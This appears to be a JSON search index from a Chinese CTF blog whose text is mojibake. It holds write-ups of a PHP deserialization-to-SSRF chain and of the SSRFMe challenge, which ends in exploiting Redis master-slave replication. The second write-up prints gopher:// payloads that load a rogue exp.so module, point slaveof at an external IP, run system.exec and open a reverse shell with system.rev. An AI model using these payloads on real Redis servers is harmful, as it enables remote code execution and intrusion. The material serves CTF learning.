__construct() { $this-\u003esymbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-\u003eFlag))){ $value($this-\u003eFlag); } else { echo \"NoNoNo,please you can look hint.php\".\"\u003c/br\u003e\"; } } } class Ha { public $start; public $start1; public $start2; public function __construct() { echo $this-\u003estart1 . \"__construct\" . \"\u003c/br\u003e\"; } public function __destruct() { if ($this-\u003estart2 === \"o.0\") { $this-\u003estart1-\u003eLove($this-\u003estart); echo \"You are Good!\".\"\u003c/br\u003e\"; } } } function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output); } if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']); } else { die(\"You are Silly goose!\"); } ?\u003e You are Silly goose! çœ‹èµ·æ¥æœ‰å¾ˆå¤šçš„ç±»ï¼Œä½†æœ‰ç”¨çš„å°±å‡ ä¸ªï¼Œåˆšçœ‹è¿™é“é¢˜çš„æ—¶å€™è¿˜æ˜¯å¾ˆè¿·çš„ï¼Œä»¥ä¸ºä»Pocç±»ä¸‹æ‰‹åˆ©ç”¨file_get_contentsï¼Œä½†çœ‹äº†å¸ˆå‚…ä»¬çš„wpå‘ç°æ ¹æœ¬æ²¡ç”¨ï¼Œè€Œä¸”Have you genuinely accomplished what you set out to do?ä¼¼ä¹ä¹Ÿæç¤ºäº†ã€‚ è¿™é‡Œçš„ç»“å°¾æ˜¯å‡½æ•°getï¼Œå…¸å‹çš„ssrfï¼Œç„¶åå¯ä»¥çœ‹åˆ°åœ¨Reç±»æœ‰æŠŠgetèµ‹å€¼ç»™å˜é‡ï¼Œè€Œç»™ä¸å­˜åœ¨çš„å˜é‡èµ‹å€¼å¯ä»¥è§¦å‘seté­”æœ¯æ–¹æ³•ï¼Œä¸¤ä¸ªsetï¼Œç¬¬ä¸€ä¸ªå®Œå…¨æ˜¯è¿·æƒ‘ï¼Œç¬¬äºŒä¸ªsetæ˜¯æ­£ç¡®çš„ã€‚è§¦å‘åï¼Œèµ‹çš„å€¼å°±æ˜¯$vauleçš„å€¼ï¼Œæ‰€ä»¥ç›´æ¥å°±è°ƒç”¨getæ–¹æ³•äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆè§¦å‘callå‘¢ï¼ŸæŠŠå¯¹è±¡å½“ä½œå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°Haç±» $this-\u003estart1-\u003eLove($this-\u003estart);æ‰€ä»¥è¿™é‡Œå°±æ˜¯å¼€å§‹ï¼Œé“¾å­ Ha::__destruct -\u003e Rd::__call -\u003e Er::__set -\u003e get exp æˆåŠŸæ‰“åˆ°äº†getæ–¹æ³• å¯æƒœæ²¡ç¯å¢ƒäº†ï¼Œæœ€åçš„é‡ç‚¹redisä¸»ä»å¤åˆ¶æ²¡åŠæ³•å¤ç°ã€‚ å‚è€ƒï¼šhttps://blog.csdn.net/mochu7777777/article/details/135760457 ","date":"2024-03-09","objectID":"/posts/rdis/:0:1","tags":["redis"],"title":"redisæ•°æ®åº“ä¸»ä»å¤åˆ¶","uri":"/posts/rdis/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe \u003c?php function check_inner_ip($url) { $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')\u003e\u003e24 == $int_ip\u003e\u003e24 || ip2long('10.0.0.0')\u003e\u003e24 == $int_ip\u003e\u003e24 || ip2long('172.16.0.0')\u003e\u003e20 == $int_ip\u003e\u003e20 || ip2long('192.168.0.0')\u003e\u003e16 == $int_ip\u003e\u003e16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); } } if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?\u003e ä»£ç å®¡è®¡ï¼Œå‡½æ•°check_inner_ipçš„ä½œç”¨è¿‡æ»¤æ‰äº†127.0.0.1ç­‰æœ¬åœ°ipï¼Œç„¶ååˆ©ç”¨ if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); }è¿‡æ»¤äº†dnsè·³è½¬çš„ç»•è¿‡æ–¹æ³•ï¼Œå¯ä»¥ç”¨dnsé‡ç»‘å®šï¼Œç„¶å0.0.0.0ä¹Ÿå¯ä»¥ç»•è¿‡ï¼ˆ0.0.0.0 ä»£è¡¨æœ¬æœº ipv4 çš„æ‰€æœ‰åœ°å€ï¼‰ã€‚ ç»•è¿‡åå¯ä»¥æ‹¿åˆ°hint çœ‹åˆ°file_put_contentsåé¢å†…å®¹å¯èƒ½ä¼šæƒ³åˆ°æ­»äº¡ç»•è¿‡ï¼Œä½†è¿™é‡Œä¸æ˜¯ï¼Œæ²¡æœ‰å†™å…¥æƒé™ã€‚å‘Šè¯‰äº†redisæ•°æ®åº“å¯†ç ï¼Œæ˜¯redisæ•°æ®åº“çš„æ”»å‡»ï¼Œ rediså¸¸è§çš„getshellæœ‰è¿™ä¹ˆå‡ ç§ï¼š ç›´æ¥å†™webshell ï¼Œå°†shellå†™åœ¨webç›®å½•ä¸‹ å†™sshå…¬é’¥ å†™crontabåå¼¹shellï¼Œåˆ©ç”¨å®šæ—¶ä»»åŠ¡è¿›è¡Œåå¼¹shell ä¸»ä»å¤åˆ¶è¿›è¡Œgetshell è¿™é‡Œç¬¬ä¸€ä¸­ä¸­æ²¡å†™å…¥æƒé™ä¸è¡Œï¼Œç„¶åè¿™é‡Œæ²¡æœ‰sshå’Œcrontabï¼Œæ‰€ä»¥åªèƒ½ç”¨ç¬¬ä¸‰ç§ï¼Œredisä¸»ä»å¤åˆ¶ã€‚ çœ‹å¸ˆå‚…ä»¬çš„wpï¼Œå‡†å¤‡å¥½ä¸¤ä¸ªå·¥å…· https://github.com/xmsec/redis-ssrf https://github.com/n0b0dyCN/redis-rogue-serverå…ˆæ˜¯è¯•äº†è‡ªå·±çš„kaliè™šæ‹Ÿæœºå’ŒæœåŠ¡å™¨éƒ½æ²¡æ”¶åˆ°å›æ˜¾ï¼Œçœ‹wpè¿˜å¯ä»¥ç”¨buuæœ¬åœ°æœºè¯•è¯•ã€‚ å¯åŠ¨buuæœ¬åœ°çš„linuxé¶æœºï¼Œé€šè¿‡sftpæŠŠæ–‡ä»¶ä¼ è¾“åˆ°é¶æœºï¼Œåœ¨é€šè¿‡sshè¿æ¥ä¸Šé¶æœºï¼Œå¦‚ä¸‹ ç„¶åå‘½ä»¤ python rogue-server.py //å¼€å§‹ç›‘å¬ä½†æ˜¯çœ‹æœ‰äº›å¸ˆå‚…çš„wpè¿˜è¦æ„é€ payloadï¼Œæœ‰äº›å¸ˆå‚…ç›´æ¥å°±ä¸»ä»è¿ä¸Šäº†ï¼Œ urlå‘½ä»¤ gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252042.193.22.50%25206666%250d%250aquit gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%252042.193.22.50%25206663%250d%250aquit ä½†ç›‘å¬æ²¡æœ‰æ”¶åˆ°ä»»ä½•è¿æ¥ï¼Œä»¥ä¸ºè¿™é“é¢˜è¦çƒ‚å°¾äº†ã€‚ åé¢å‘¨å¸ˆå‚…å‘Šè¯‰æˆ‘åœ¨NSSCTFä¸Šé¢æœ‰åŒæ ·çš„é¢˜ï¼Œæ¢ä¸ªé¶åœºçœ‹çœ‹ é¦–å…ˆå…ˆç»™kaliå†…ç½‘ç©¿é€ ç„¶åä¸‹è½½å¥½å·¥å…·ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆå·¥å…·ä¸ä¸€æ ·ï¼‰ å‚è€ƒï¼šå¾ˆç»å…¸çš„ä¸€é“CTF-WriteUP(ç½‘é¼æ¯ 2020 ç„æ­¦ç»„)SSRFMe - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· å‚è€ƒï¼šhttps://blog.csdn.net/m0_73512445/article/details/134740916 https://github.com/n0b0dyCN/redis-rogue-server # redis-rogue-serverï¼Œæœªæˆæƒä½¿ç”¨ https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server # Awsome-Redis-Rogue-Serverï¼Œæœ‰æˆæƒä½¿ç”¨ç„¶åæŠŠredis-rogue-serverçš„exp.soå¤åˆ¶åˆ°Awsome-Redis-Rogue-Serveræ–‡ä»¶ä¸­ï¼Œå¼€å¯ç›‘å¬ï¼ˆæœ€å¼€å§‹ç›‘å¬çš„æ˜¯9001ï¼Œç»“æœå‘ç°è¿˜æ˜¯æ²¡å›æ˜¾ï¼Œä»¥ä¸ºåˆæ˜¯ç¯å¢ƒé—®é¢˜ï¼Œç»“æœæ˜¯frpé…ç½®é—®é¢˜ï¼Œå¥½åœ¨å½“åˆå¤šé…äº†å‡ ä¸ªç«¯å£ï¼‰ python3 redis_rogue_server.py -v -path exp.so -lport 6666å…ˆä¼ å…¥ gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit //è®¾ç½®å¤‡ä»½æ–‡ä»¶è·¯å¾„ï¼Œåªæœ‰/tmpç›®å½•æœ‰æƒé™ gopher://0.0.0.0:6379/_auth root config set dir /tmp/ quitä¼šå’Œä¸Šé¢ä¸€æ ·ï¼Œå›æ˜¾ä¸‰ä¸ªOK ç„¶ååœ¨ä¼ å…¥ gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520ip%25209003%250d%250aquit //è®¾ç½®äº†å¤‡ä»½æ–‡ä»¶åï¼Œç„¶åå»ºç«‹ä¸»ä»è”ç³» gopher://0.0.0.0:6379/_auth root config set dbfilename exp.so slaveof å…¬ç½‘ip 9003 quit kaliä¸»æœºå¾—åˆ°å›æ˜¾ï¼Œå¼€å§‹ä¸€ç›´å¾ªç¯åŒæ­¥ã€‚ gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit //æŠŠæ”»å‡»æ¨¡å—åŠ è½½åˆ°ä»æœº gopher://0.0.0.0:6379/_auth root module load ./exp.so quit ä¼ å…¥ gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit //æ–­å¼€ä¸»ä»åŒæ­¥ gopher://0.0.0.0:6379/_auth root slaveof NO ONE quitä¸»æœºï¼š å¯¼å…¥äº†æ¨¡å—å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº† gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit gopher://0.0.0.0:6379/_auth root system.exec \"cat /flag\" quitå¾—åˆ°flag è‡³äºä¸ºä»€ä¹ˆä¸Šé¢æ˜¾ç¤ºè¿æ¥æ¥è‡ªäº127.0.0.1ï¼Œå…¶å®æ˜¯å› ä¸ºfrpçš„åŸå› ï¼Œå¯ä»¥çœ‹çœ‹äº‘æœåŠ¡å™¨ä¸Š æ„æ€æ˜¯è¿æ¥æ—¶ç”±äº‘æœåŠ¡å™¨è½¬è¿‡æ¥çš„ï¼Œæ‰€ä»¥æ˜¾ç¤º127.0.0.1 è¿™é“é¢˜è¿˜å¯ä»¥åå¼¹shellï¼Œæˆ‘å°±ä¸å¤ç°äº†ã€‚ ","date":"2024-03-09","objectID":"/posts/rdis/:0:2","tags":["redis"],"title":"redisæ•°æ®åº“ä¸»ä»å¤åˆ¶","uri":"/posts/rdis/"},{"categories":null,"content":"ä»‹ç» ğŸ“ æˆä¿¡å¤§ä¿¡æ¯å®‰å…¨ä¸“ä¸š ğŸ’» CTF\u0026web ğŸŒ± å‘âœŒä»¬å­¦ä¹  âœï¸ D0g3æˆå‘˜ ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"\r6s6\rweb\u0026misc\rYuy0ung\rweb\u0026misc\rfupanc\rweb\rVVkladg0\rweb\rtammy66\rweb\rLitsasuk\rweb\rpRism\rre\r","date":"0001-01-01","objectID":"/links/:0:0","tags":null,"title":"Links","uri":"/links/"}]